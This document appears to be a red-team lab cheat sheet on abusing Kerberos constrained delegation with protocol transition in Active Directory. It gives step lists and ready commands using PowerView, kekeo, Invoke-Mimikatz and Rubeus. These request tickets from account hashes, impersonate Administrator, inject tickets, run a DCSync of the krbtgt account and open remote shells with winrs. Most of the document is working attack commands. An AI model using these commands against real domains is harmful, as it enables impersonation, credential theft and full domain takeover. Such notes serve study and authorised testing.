# 2 Constrained Delegation with Protocol Transition

## Using PowerShell

### Methodology/Steps

> 1. List all the users having Constrained Delegation
> 2. Keep a note of the **msDS-AllowedToDelegateTo** value
> 3. Request for a TGT using the hash of the user with CD using kekeo (Which me must have collected before)
> 4. Keep a note of the TGT return ticket
> 5. Now request a TGS with the 2nd step and 4th step values as parameters in _/service_ and _/tgt_
> 6. Keep a note of the TGS return Ticket
> 7. Now we can inject the TGS return Ticket with **Inkove-Mimikatz**
> 8. We can now list the file systems of that account. Example : **`ls \\dc-mysql\C$`** but _can not_ use any **WMI-Commands**. We can use _ScriptBlock_ to execute commands on the system.
> 9. But if the user DC we can do the same process and then do a **DCSync** attack

***

### PowerView \[ Dev Branch ]

#### Enumerate users and computers with CD enabled

```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

***

### kekeo

#### Requesting a TGT

```shell
tgt::ask /user:websvc /domain:domain.local /rc4:cc098f204c5887eaa8253e7c2749156f
tgt::ask /user:dcorp-adminsrv /domain:domain.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
```

#### Request a TGS

```shell
tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:cifs/computer.domain.LOCAL
tgs::s4u /tgt:TGT.kirbi /user:Administrator@domain.local /service:time/computer.domain.LOCAL|ldap/computer.domain.LOCAL
```

***

### Invoke-Mimikatz

#### Inject the ticket

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt TGS.kirbi"'
```

#### Execute DCSync

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

#### ScriptBlock

```powershell
Inoke-Command -ScriptBlock{whoami} -ComputerName us-mssql.us.techcorp.local
```

***

## Using Binaries

### Methodology/Steps

> 1. Use Rubeus to request a TGS for the user and inject it into memory
> 2. Remote login the machine using winrs

***

### Rubeus

#### 1. Request for a S4U

```powershell
Rubeus.exe s4u /user:appsvc /rc4:1D49D390AC01D568F0EE9BE82BB74D4C /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
```

#### 2. Remote login using winrs

```powershell
winrs -r:us-mssql cmd.exe
```
